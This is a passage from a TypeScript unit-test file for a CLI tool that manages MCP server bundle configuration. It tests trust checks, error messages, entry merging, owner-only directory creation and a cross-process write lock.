      // Every READABLE status is decided by the hash, so a stale path record
      // must not rescue a file whose bytes changed or was never approved.
      expect(projectFileIsHonoured({ ...base, status: "changed", pathTrusted: true })).toBe(false);
      expect(projectFileIsHonoured({ ...base, status: "untrusted", pathTrusted: true })).toBe(false);
      expect(projectFileIsHonoured({ ...base, status: "store-unreadable", pathTrusted: true })).toBe(false);
    });

    it("still honours a trusted file and ignores 'none'", () => {
      expect(projectFileIsHonoured({ ...base, status: "trusted", pathTrusted: true })).toBe(true);
      expect(projectFileIsHonoured({ ...base, status: "none", pathTrusted: true })).toBe(false);
    });
  });

  it("probeProjectTrust reports pathTrusted for an approved path whose contents changed", async () => {
    // The path-only lookup has to agree with grantTrust's key normalization
    // (case-insensitive on Windows). Exercised through a real grant so a
    // divergence in normalizeTrustKey shows up here rather than in prod.
    await writeTrustedProjectBundles(synthCwd, { version: 1, servers: [] });
    writeBundles(synthCwd, { version: 1, servers: [{ namespace: "later", name: "Later", command: "npx" }] });
    const probe = await probeProjectTrust({ home: synthHome, cwd: synthCwd, env: {} });
    expect(probe.status).toBe("changed");
    expect(probe.pathTrusted).toBe(true);
  });

  it("probeProjectTrust reports pathTrusted:false for a never-approved path", async () => {
    writeBundles(synthCwd, { version: 1, servers: [] });
    const probe = await probeProjectTrust({ home: synthHome, cwd: synthCwd, env: {} });
    expect(probe.pathTrusted).toBe(false);
  });

  it("YAW_MCP_TRUST_PROJECT=1 still commits to an unreadable project file", async () => {
    // The escape hatch means "treat this checkout as approved" -- a strictly
    // larger grant than the path record, so it keeps the pre-gate behaviour:
    // the loader COMMITS to the unreadable project file (config null, path =
    // the project file, a read warning) instead of substituting user-global.
    // Staged with the injected ENOTDIR, not commitYawMcpAsFile: Windows
    // reports that on-disk shape as ENOENT, so on the one machine that runs
    // this suite the case used to assert the fallthrough branch and the
    // behaviour in its name was never exercised anywhere.
    writeBundles(synthHome, GLOBAL);
    writeBundles(synthCwd, { version: 1, servers: [{ namespace: "project", name: "Project", command: "npx" }] });
    failReadsOf(projectBundlesPath(synthCwd), "ENOTDIR");
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd, env: { YAW_MCP_TRUST_PROJECT: "1" } });
    expect(r.config).toBeNull();
    expect(r.path).toBe(projectBundlesPath(synthCwd));
    expect(r.warnings.some((w) => w.includes(projectBundlesPath(synthCwd)) && w.includes("could not read"))).toBe(true);
  });
});

// Fix 9: readRawUserBundles error branching -- parse vs. read errors get
// distinct messages so users know whether to fix permissions or JSON.
describe("readRawUserBundles error message branching (fix 9)", () => {
  it("throws a parse-error message when bundles.json is invalid JSON", async () => {
    mkdirSync(join(synthHome, CONFIG_DIRNAME), { recursive: true });
    writeFileSync(localBundlesPath(join(synthHome, CONFIG_DIRNAME)), "{ bad json }");
    await expect(
      upsertUserBundle(
        { namespace: "test", name: "Test", command: "npx", args: [], isActive: true },
        { home: synthHome },
      ),
    ).rejects.toThrow(/could not be parsed.*fix the JSON/i);
  });

  it("throws a permissions-error message when bundles.json is unreadable", async () => {
    // The branch is a decision about the WARNING TEXT (read error -> "fix the
    // permissions"; parse error -> "fix the JSON"), so the read failure is
    // injected rather than staged with a POSIX-only chmod 000.
    mkdirSync(join(synthHome, CONFIG_DIRNAME), { recursive: true });
    const bundlesFile = localBundlesPath(join(synthHome, CONFIG_DIRNAME));
    writeFileSync(bundlesFile, JSON.stringify({ version: 1, servers: [] }));
    failReadsOf(bundlesFile, "EACCES");
    await expect(
      upsertUserBundle(
        { namespace: "test", name: "Test", command: "npx", args: [], isActive: true },
        { home: synthHome },
      ),
    ).rejects.toThrow(/could not be read.*check file permissions/i);
  });

  // The read-vs-parse decision used to be an /EPERM|EACCES|could not read/i
  // test over the JOINED warning text -- which begins with the full path. A
  // home directory whose name merely CONTAINS "eaccess" therefore matched the
  // errno alternation, and an ordinary JSON syntax error was reported as a
  // permissions problem: the user goes off to run chmod on a file whose
  // permissions were fine the whole time.
  it("reports a syntax error as a PARSE failure even when the path contains an errno-like word", async () => {
    const trapHome = mkdtempSync(join(tmpdir(), "yaw-mcp-eaccess-"));
    try {
      mkdirSync(join(trapHome, CONFIG_DIRNAME), { recursive: true });
      writeFileSync(localBundlesPath(join(trapHome, CONFIG_DIRNAME)), "{ bad json }");
      await expect(
        upsertUserBundle(
          { namespace: "test", name: "Test", command: "npx", args: [], isActive: true },
          { home: trapHome },
        ),
      ).rejects.toThrow(/could not be parsed.*fix the JSON/i);
    } finally {
      rmSync(trapHome, { recursive: true, force: true });
    }
  });
});

// A DIRECTORY at the bundles.json path used to be classified "absent"
// (readBundlesRawAt folded EISDIR in with ENOENT) -- but existsSync() says
// true, so the write path committed to the location, found no warnings to
// explain itself, and fell through to the generic "could not be parsed -- fix
// the JSON" with an EMPTY detail. The user is then told to fix JSON in
// something that is not a file.
describe("a directory at the bundles.json path is reported as itself", () => {
  /** `mkdir -p <home>/.yaw-mcp/bundles.json` -- readFile on it is EISDIR on
   *  every platform, so no errno injection is needed. */
  function directoryAtBundlesPath(dir: string): string {
    const path = localBundlesPath(join(dir, CONFIG_DIRNAME));
    mkdirSync(path, { recursive: true });
    return path;
  }

  it("the write path names the directory instead of blaming the JSON", async () => {
    directoryAtBundlesPath(synthHome);
    await expect(
      upsertUserBundle(
        { namespace: "test", name: "Test", command: "npx", args: [], isActive: true },
        { home: synthHome },
      ),
    ).rejects.toThrow(/is a directory, not a file/i);
  });

  it("the loader warns and stays committed to the path instead of reading it as absent", async () => {
    const path = directoryAtBundlesPath(synthHome);
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd, env: {} });
    expect(r.config).toBeNull();
    // exists:true -- the loader commits to the location it found something at.
    expect(r.path).toBe(path);
    expect(r.warnings.some((w) => w.includes("the path is a directory, not a file"))).toBe(true);
  });
});

// The write path (add/remove) must round-trip the top-level defaultRuntime --
// dropping it on an unrelated `yaw-mcp add` would silently flip every
// defaulted server back to node.
describe("defaultRuntime round-trip through the write path", () => {
  it("upsertUserBundle preserves an existing top-level defaultRuntime", async () => {
    writeBundles(synthHome, { version: 1, defaultRuntime: "oam", servers: [] });
    await upsertUserBundle(
      { namespace: "fetch", name: "Fetch", command: "npx", args: [], isActive: true },
      { home: synthHome },
    );
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.defaultRuntime).toBe("oam");
    expect(r.config?.servers.map((s) => s.namespace)).toEqual(["fetch"]);
  });

  it("removeUserBundle preserves an existing top-level defaultRuntime", async () => {
    writeBundles(synthHome, {
      version: 1,
      defaultRuntime: "oam",
      servers: [{ namespace: "fetch", name: "Fetch", command: "npx" }],
    });
    await removeUserBundle("fetch", { home: synthHome });
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.defaultRuntime).toBe("oam");
    expect(r.config?.servers).toEqual([]);
  });
});

// An upsert onto an EXISTING slot is a partial update, not a slot swap: the
// caller (`yaw-mcp add`) rebuilds its entry from the catalog every time, so a
// wholesale replace silently destroyed state only the user could have put
// there. See mergeServerEntry.
describe("upsertUserBundle merges onto the stored entry", () => {
  const stored = (): Record<string, unknown> =>
    (
      JSON.parse(readFileSync(localBundlesPath(join(synthHome, CONFIG_DIRNAME)), "utf8")).servers as Array<
        Record<string, unknown>
      >
    )[0];

  it("merges env per key and never blanks a stored value with an empty one", async () => {
    writeBundles(synthHome, {
      version: 1,
      servers: [{ namespace: "gh", name: "GH", command: "npx", env: { TOKEN: "secret", OTHER: "keep" } }],
    });
    const res = await upsertUserBundle(
      { namespace: "gh", name: "GH", command: "npx", args: ["-y", "new"], env: { TOKEN: "", ADDED: "v" } },
      { home: synthHome },
    );
    expect(res.replaced).toBe(true);
    expect(stored().env).toEqual({ TOKEN: "secret", OTHER: "keep", ADDED: "v" });
    // The result reports what actually landed, so callers can describe the file.
    expect((res.entry.env as Record<string, string>).TOKEN).toBe("secret");
    expect(res.entry.args).toEqual(["-y", "new"]);
  });

  // The mirror image of the rule above. A BLANK stored value is not data: it
  // is `add`'s "this key is required, nothing stored" marker. When the catalog
  // stops requiring the key, the incoming entry stops listing it -- and the
  // per-key merge used to keep re-copying the stale marker forever, so `list
  // --json` and the removal preview went on reporting a required var that no
  // longer exists.
  it("drops a stale blank seed the incoming entry no longer lists, but never a stored value", async () => {
    writeBundles(synthHome, {
      version: 1,
      servers: [{ namespace: "gh", name: "GH", command: "npx", env: { DROPPED_KEY: "", TOKEN: "secret" } }],
    });
    const res = await upsertUserBundle(
      { namespace: "gh", name: "GH", command: "npx", env: { STILL_REQUIRED: "" } },
      { home: synthHome },
    );
    expect(stored().env).toEqual({ TOKEN: "secret", STILL_REQUIRED: "" });
    expect(res.entry.env).toEqual({ TOKEN: "secret", STILL_REQUIRED: "" });
  });

  it("leaves no empty env husk when the last required key is dropped", async () => {
    writeBundles(synthHome, {
      version: 1,
      servers: [{ namespace: "gh", name: "GH", command: "npx", env: { ONLY_KEY: "" } }],
    });
    await upsertUserBundle({ namespace: "gh", name: "GH", command: "npx" }, { home: synthHome });
    expect(stored().env).toBeUndefined();
  });

  it("does not re-enable an entry the user explicitly disabled", async () => {
    writeBundles(synthHome, { version: 1, servers: [{ namespace: "gh", name: "GH", isActive: false }] });
    await upsertUserBundle({ namespace: "gh", name: "GH", command: "npx", isActive: true }, { home: synthHome });
    expect(stored().isActive).toBe(false);
    // An explicit false still disables an enabled entry.
    writeBundles(synthHome, { version: 1, servers: [{ namespace: "x", name: "X", isActive: true }] });
    await upsertUserBundle({ namespace: "x", name: "X", isActive: false }, { home: synthHome });
    expect(stored().isActive).toBe(false);
  });

  // `add --dry-run` renders previewUpsertUserBundle's entry, so it has to be
  // the MERGED one. Built from the incoming entry instead, the preview told a
  // user who hand-disabled a server that the add would make it loadable --
  // while the write keeps `isActive: false` (the rule above) -- and showed a
  // stored --env value as absent.
  it("previewUpsertUserBundle returns the MERGED entry the write would land", async () => {
    writeBundles(synthHome, {
      version: 1,
      servers: [
        { namespace: "gh", name: "GH", command: "old", args: ["stale"], isActive: false, env: { TOKEN: "secret" } },
      ],
    });
    const incoming = { namespace: "gh", name: "GH", command: "npx", args: ["-y", "gh"], isActive: true };
    const preview = await previewUpsertUserBundle(incoming, { home: synthHome });
    expect(preview.replaced).toBe(true);
    expect(preview.entry.isActive).toBe(false);
    expect(preview.entry.env).toEqual({ TOKEN: "secret" });
    // ...while what a re-add is FOR is still previewed as refreshed.
    expect(preview.entry.args).toEqual(["-y", "gh"]);
    // A preview writes nothing.
    expect(stored().command).toBe("old");
    // ...and the real run lands exactly what it showed.
    const res = await upsertUserBundle(incoming, { home: synthHome });
    expect(res.entry).toEqual(preview.entry);
  });

  it("previewUpsertUserBundle passes a FRESH add's entry through untouched", async () => {
    const incoming = { namespace: "solo", name: "Solo", command: "npx", isActive: true };
    const preview = await previewUpsertUserBundle(incoming, { home: synthHome });
    expect(preview.replaced).toBe(false);
    expect(preview.entry).toEqual(incoming);
  });

  it("keeps fields the incoming entry says nothing about, and reports a fresh add", async () => {
    const res = await upsertUserBundle(
      { namespace: "solo", name: "Solo", command: "npx", isActive: true },
      { home: synthHome },
    );
    expect(res.replaced).toBe(false);
    expect(res.entry.namespace).toBe("solo");
    writeBundles(synthHome, {
      version: 1,
      servers: [{ namespace: "gh", name: "GH", command: "old", runtime: "oam", connectTimeoutMs: 60000, mine: 1 }],
    });
    await upsertUserBundle({ namespace: "gh", name: "GH", command: "npx" }, { home: synthHome });
    const e = stored();
    expect(e.command).toBe("npx");
    expect(e.runtime).toBe("oam");
    expect(e.connectTimeoutMs).toBe(60000);
    expect(e.mine).toBe(1);
  });
});

// Fix 2: bundleWriteChain serializer -- concurrent calls must not lose writes
describe("upsertUserBundle / removeUserBundle serializer (fix 2)", () => {
  it("concurrent upserts do not lose any entry", async () => {
    const namespaces = ["aaa", "bbb", "ccc", "ddd", "eee"];
    // Fan out all writes without awaiting between them.
    await Promise.all(
      namespaces.map((ns) =>
        upsertUserBundle(
          { namespace: ns, name: ns.toUpperCase(), command: "npx", args: [], isActive: true },
          { home: synthHome },
        ),
      ),
    );
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    const writtenNs = (r.config?.servers ?? []).map((s) => s.namespace).sort();
    expect(writtenNs).toEqual([...namespaces].sort());
  });

  it("interleaved upsert then remove serializes correctly", async () => {
    // Add three servers concurrently, then remove one concurrently with an add.
    await Promise.all([
      upsertUserBundle(
        { namespace: "alpha", name: "Alpha", command: "npx", args: [], isActive: true },
        { home: synthHome },
      ),
      upsertUserBundle(
        { namespace: "beta", name: "Beta", command: "npx", args: [], isActive: true },
        { home: synthHome },
      ),
      upsertUserBundle(
        { namespace: "gamma", name: "Gamma", command: "npx", args: [], isActive: true },
        { home: synthHome },
      ),
    ]);
    // Now concurrently remove beta and add delta.
    await Promise.all([
      removeUserBundle("beta", { home: synthHome }),
      upsertUserBundle(
        { namespace: "delta", name: "Delta", command: "npx", args: [], isActive: true },
        { home: synthHome },
      ),
    ]);
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    const writtenNs = (r.config?.servers ?? []).map((s) => s.namespace).sort();
    expect(writtenNs).toContain("alpha");
    expect(writtenNs).toContain("gamma");
    expect(writtenNs).toContain("delta");
    expect(writtenNs).not.toContain("beta");
  });
});

// Gap 14: the write path passes dirMode 0o700 to atomicWriteFile so a
// freshly-created ~/.yaw-mcp/ is born owner-only (bundles.json can carry
// per-server `--env` secrets, so its parent must not be group/other-listable).
// The serializer tests above reach the create-fresh-dir path via upsert but
// never stat the dir's mode -- these assert the 0o700 birth directly.
describe("write path births ~/.yaw-mcp/ owner-only (0o700)", () => {
  // Asserted through the dirMode the write path REQUESTS, not through
  // stat().mode on the finished directory: POSIX mode bits are not meaningful
  // on Windows (chmod is a near no-op there and stat reports a synthetic
  // 0o666), so the on-disk form pinned nothing on the only machine that runs
  // this suite. atomic-write.test.ts covers that request reaching mkdir(2).
  const userBundlesPath = (): string => localBundlesPath(join(synthHome, CONFIG_DIRNAME));

  it("upsertUserBundle asks for dirMode 0o700 when it births a fresh .yaw-mcp/", async () => {
    const atomic = await import("../atomic-write.js");
    const spy = vi.spyOn(atomic, "atomicWriteFile");
    // synthHome has no .yaw-mcp/ yet (nothing pre-created it this test), so
    // the write path births it: withBundlesLock's mkdir first (0o700, so the
    // lock sidecar has somewhere to live), and atomicWriteFile is still ASKED
    // for the same 0o700 so the two creators cannot drift apart.
    expect(existsSync(join(synthHome, CONFIG_DIRNAME))).toBe(false);
    await upsertUserBundle(
      { namespace: "github", name: "GitHub", command: "npx", args: [], isActive: true },
      { home: synthHome },
    );
    expect(existsSync(join(synthHome, CONFIG_DIRNAME))).toBe(true);
    const call = spy.mock.calls.find((c) => c[0] === userBundlesPath());
    expect(call, "the user bundles file was never written").toBeDefined();
    expect(call?.[4]).toBe(0o700);
  });

  // doRemoveUserBundle early-returns (removed:false) when the file is absent,
  // so it can only reach its own atomicWriteFile once the dir already exists.
  // Seed via upsert, then exercise the remove write path and confirm it asks
  // for the same owner-only parent rather than dropping the dirMode.
  it("removeUserBundle's write path asks for dirMode 0o700 too", async () => {
    await upsertUserBundle(
      { namespace: "gone", name: "Gone", command: "npx", args: [], isActive: true },
      { home: synthHome },
    );
    const atomic = await import("../atomic-write.js");
    const spy = vi.spyOn(atomic, "atomicWriteFile");
    const res = await removeUserBundle("gone", { home: synthHome });
    expect(res.removed).toBe(true);
    const call = spy.mock.calls.find((c) => c[0] === userBundlesPath());
    expect(call, "the user bundles file was never rewritten").toBeDefined();
    expect(call?.[4]).toBe(0o700);
  });
});

// readRawUserBundles used to run a sync existsSync() and THEN the real read.
// A file removed between the two (a concurrent `remove`, an `rm`, the app
// replacing it by rename) was "present" by the first and ENOENT by the
// second -- and ENOENT is the one read outcome that adds no warning, so the
// write path fell into "could not be parsed -- fix the JSON" with an EMPTY
// detail, blaming the syntax of a file that no longer existed. The read
// already tells absent from present-but-broken; it is now the only check.
describe("a bundles.json that vanishes before the read is absent, not unparseable", () => {
  it("previewUpsertUserBundle previews a fresh add instead of throwing a parse failure", async () => {
    const path = localBundlesPath(join(synthHome, CONFIG_DIRNAME));
    writeBundles(synthHome, { version: 1, servers: [{ namespace: "gone", name: "Gone", command: "npx" }] });
    // existsSync() says present; the read says ENOENT.
    failReadsOf(path, "ENOENT");
    const preview = await previewUpsertUserBundle(
      { namespace: "fresh", name: "Fresh", command: "npx", isActive: true },
      { home: synthHome },
    );
    expect(preview.replaced).toBe(false);
    expect(preview.warnings).toEqual([]);
  });
});

describe("probeProjectTrust threads its env into the project-dir walk", () => {
  it("honours the outside-$HOME ownership opt-in from the INJECTED env, not process.env", async () => {
    // A cwd that is NOT under synthHome: the walk is unbounded there, so the
    // candidate goes through the ownership gate -- which on win32 has no uid
    // to compare and answers from env[ALLOW_UNOWNED_ENV] alone. The walk used
    // to be handed no env and read the real process's, so an opt-in an
    // embedded or test caller injected was honoured by the trust half of the
    // probe and ignored by the project-dir half. process.env is scrubbed of
    // the key for the duration so the injected env is the only place it can
    // come from. (On POSIX the uid match passes the gate either way, so the
    // assertion holds on every platform and discriminates on win32.)
    const outside = realpathSync(mkdtempSync(join(tmpdir(), "yaw-mcp-outside-")));
    const saved = process.env[ALLOW_UNOWNED_ENV];
    delete process.env[ALLOW_UNOWNED_ENV];
    try {
      writeBundles(outside, { version: 1, servers: [{ namespace: "outside", name: "Outside", command: "npx" }] });
      const probe = await probeProjectTrust({ cwd: outside, home: synthHome, env: { [ALLOW_UNOWNED_ENV]: "1" } });
      expect(probe.path).toBe(projectBundlesPath(outside));
      // ...and the loader, which runs the same probe, loads the same file.
      const r = await loadLocalBundles({
        cwd: outside,
        home: synthHome,
        env: { [ALLOW_UNOWNED_ENV]: "1", YAW_MCP_TRUST_PROJECT: "1" },
      });
      expect(r.path).toBe(projectBundlesPath(outside));
      expect(r.config?.servers.map((s) => s.namespace)).toEqual(["outside"]);
    } finally {
      if (saved === undefined) delete process.env[ALLOW_UNOWNED_ENV];
      else process.env[ALLOW_UNOWNED_ENV] = saved;
      rmSync(outside, { recursive: true, force: true });
    }
  });
});

// The cross-process write lock (withBundlesLock). The in-process chain above
// cannot see a SECOND yaw-mcp process -- two terminals running `add`, or the
// CLI racing the Yaw Terminal app's own writer -- and without the lock both
// read the same snapshot and the second write silently erased the first's
// entry (and any stored --env value on it). "Another process" is staged as
// the O_EXCL sidecar such a process leaves behind: written with a FOREIGN
// pid, so the SUT's ownership-checked release can never mistake it for its
// own and unlink it.
describe("cross-process bundles.json lock", () => {
  const entry = { namespace: "held", name: "Held", command: "npx", args: [], isActive: true };
  const configDir = (): string => join(synthHome, CONFIG_DIRNAME);
  const lockPath = (): string => join(configDir(), BUNDLES_LOCK_NAME);
  const bundlesPath = (): string => localBundlesPath(configDir());
  const namespacesOnDisk = (): string[] =>
    (JSON.parse(readFileSync(bundlesPath(), "utf8")) as { servers: Array<{ namespace: string }> }).servers.map(
      (s) => s.namespace,
    );

  /** What a live writer in another process leaves at the lock path. The pid
   *  on file has to belong to a RUNNING process: acquireUpgradeLock probes
   *  it with kill(pid, 0) and steals a lock whose holder is gone, so a made-up
   *  pid would read as a crashed holder and be taken at once. This process
   *  stands in for the foreign holder -- it is alive, and acquireUpgradeLock
   *  only trusts its own pid on the RELEASE path, not on the held path. */
  const FOREIGN_HOLDER = `${process.pid}\n`;
  function holdForeignLock(): void {
    mkdirSync(configDir(), { recursive: true });
    writeFileSync(lockPath(), FOREIGN_HOLDER, { flag: "wx" });
  }

  /** Settle-tracking that handles a rejection too, so a failing case reports
   *  through its assertions rather than as an unhandled rejection. */
  function track(p: Promise<unknown>): () => boolean {
    let done = false;
    const mark = (): void => {
      done = true;
    };
    p.then(mark, mark);
    return () => done;
  }

  it("upsertUserBundle waits for a lock another process holds, writes once it is released, and lets go", async () => {
    holdForeignLock();
    const pending = upsertUserBundle(entry, { home: synthHome });
    const settled = track(pending);
    // Several poll intervals in: still waiting, and nothing written around the lock.
    await new Promise((r) => setTimeout(r, 120));
    expect(settled()).toBe(false);
    expect(existsSync(bundlesPath())).toBe(false);
    unlinkSync(lockPath());
    const res = await pending;
    expect(res.replaced).toBe(false);
    expect(namespacesOnDisk()).toEqual(["held"]);
    // Released after the write: no sidecar left for the next writer to wait on.
    expect(existsSync(lockPath())).toBe(false);
  });

  it("removeUserBundle waits on the same lock", async () => {
    writeBundles(synthHome, { version: 1, servers: [{ namespace: "held", name: "Held", command: "npx" }] });
    holdForeignLock();
    const pending = removeUserBundle("held", { home: synthHome });
    const settled = track(pending);
    await new Promise((r) => setTimeout(r, 120));
    expect(settled()).toBe(false);
    expect(namespacesOnDisk()).toEqual(["held"]);
    unlinkSync(lockPath());
    const res = await pending;
    expect(res.removed).toBe(true);
    expect(namespacesOnDisk()).toEqual([]);
    expect(existsSync(lockPath())).toBe(false);
  });

  it("gives up after BUNDLES_LOCK_WAIT_MS naming the lock file, and writes NOTHING around a live lock", async () => {
    // The lock is taken BEFORE the clock is faked, so its real mtime sits at
    // or before the fake "now" and the primitive reads it as live throughout.
    holdForeignLock();
    // Only the clock and setTimeout are faked: withBundlesLock's mkdir and
    // the poll that follows it need the real event loop (setImmediate stays
    // real) to schedule the first poll at all -- advancing before it exists
    // would only move the clock past a deadline nothing had measured yet.
    vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout", "Date"] });
    try {
      const pending = upsertUserBundle(entry, { home: synthHome });
      const outcome = pending.then(
        () => null,
        (e: unknown) => e as Error,
      );
      while (vi.getTimerCount() === 0) await new Promise<void>((r) => setImmediate(r));
      await vi.advanceTimersByTimeAsync(BUNDLES_LOCK_WAIT_MS + 100);
      const err = await outcome;
      expect(err?.message).toMatch(/is locked by another yaw-mcp process/);
      expect(err?.message).toContain(lockPath());
    } finally {
      vi.useRealTimers();
    }
    expect(existsSync(bundlesPath())).toBe(false);
    // Honoured, never stolen: the live holder's lock is exactly as it was.
    expect(readFileSync(lockPath(), "utf8")).toBe(FOREIGN_HOLDER);
  });

  it("steals a lock a crashed holder left behind instead of waiting on it", async () => {
    holdForeignLock();
    // Provably stale: a holder keeps the lock for one read plus one write, so
    // a day-old mtime is past any live window. A day rather than the
    // primitive's own UPGRADE_LOCK_STALE_MS (private to auto-upgrade): it
    // stays stale for any bound that constant could plausibly grow to.
    const dayAgo = (Date.now() - 24 * 60 * 60 * 1000) / 1000;
    utimesSync(lockPath(), dayAgo, dayAgo);
    const res = await upsertUserBundle(entry, { home: synthHome });
    expect(res.replaced).toBe(false);
    expect(namespacesOnDisk()).toEqual(["held"]);
    // The steal renames the stale file to a private name and unlinks it, and
    // the write's own lock is released: nothing lock-shaped survives.
    expect(readdirSync(configDir()).filter((f) => f.startsWith(BUNDLES_LOCK_NAME))).toEqual([]);
  });

  it("steals a FRESH lock whose holder process is gone, without waiting out the window", async () => {
    // The shape a killed Yaw Terminal / serve leaves: live mtime, dead pid.
    // Waiting on it meant every add/remove was refused for the full stale
    // window ("locked by another yaw-mcp process") when nothing held it.
    mkdirSync(configDir(), { recursive: true });
    writeFileSync(lockPath(), `${2 ** 31 - 2}\n`, { flag: "wx" });
    const started = Date.now();
    const res = await upsertUserBundle(entry, { home: synthHome });
    // Well inside BUNDLES_LOCK_WAIT_MS: the steal happened on the first take,
    // not after the give-up deadline.
    expect(Date.now() - started).toBeLessThan(BUNDLES_LOCK_WAIT_MS);
    expect(res.replaced).toBe(false);
    expect(namespacesOnDisk()).toEqual(["held"]);
    // The steal renames the stale file to a private name and unlinks it, and
    // the write's own lock is released: nothing lock-shaped survives.
    expect(readdirSync(configDir()).filter((f) => f.startsWith(BUNDLES_LOCK_NAME))).toEqual([]);
  });

  it("takes the lock before the very FIRST write on a fresh machine, creating the dir it lives in", async () => {
    // O_EXCL cannot create a sidecar in a dir that does not exist, and the
    // lock primitive reads that ENOENT as "no lock possible, proceed" -- so
    // without the mkdir the one write that births ~/.yaw-mcp/ ran unlocked.
    expect(existsSync(configDir())).toBe(false);
    const atomic = await import("../atomic-write.js");
    const original = atomic.atomicWriteFile;
    let lockHeldDuringWrite: boolean | undefined;
    vi.spyOn(atomic, "atomicWriteFile").mockImplementation((...args) => {
      lockHeldDuringWrite = existsSync(lockPath());
      return original(...args);
    });
    await upsertUserBundle(entry, { home: synthHome });
    expect(lockHeldDuringWrite).toBe(true);
    expect(existsSync(lockPath())).toBe(false);
  });

  it("a no-op remove on a machine with no bundles.json leaves no config dir behind", async () => {
    // Taking the lock creates ~/.yaw-mcp/ (above); a remove with nothing to
    // remove early-outs BEFORE it, so its only effect is not a new directory.
    expect(existsSync(configDir())).toBe(false);
    const res = await removeUserBundle("nothing", { home: synthHome });
    expect(res.removed).toBe(false);
    expect(existsSync(configDir())).toBe(false);
  });
});
